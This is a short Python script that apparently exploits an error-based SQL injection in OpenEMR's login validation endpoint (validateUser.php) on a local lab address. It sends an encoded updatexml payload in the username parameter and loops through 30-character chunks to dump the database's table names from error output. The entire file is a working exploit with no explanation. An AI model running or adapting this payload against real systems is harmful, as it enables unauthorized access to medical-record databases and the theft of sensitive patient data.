import requests
import logging

LOG_FORMAT = "%(lineno)d - %(asctime)s - %(levelname)s - %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)

iSession = requests.session()

urlTemplate = 'http://192.168.159.131/openemr/interface/login/validateUser.php?u=%27%20or%20updatexml%281%2Cconcat%280x7e%2Csubstr%28%28select%20group%5Fconcat%28table%5Fname%29%20from%20information%5Fschema%2Etables%20where%20table%5Fschema%3Ddatabase%28%29%29%2C{}%2C30%29%2C0x7e%29%2C1%29%20%23'

def query(startPoint):
    res=iSession.get(urlTemplate.format(startPoint))
    res=res.text.split('~')
    return res[1]

res = 't'
fullRes = ''
startPoint=1
while res!='':
    res=query(startPoint)
    startPoint+=30
    fullRes+=res
    logging.info(res)

print("Finished:",fullRes)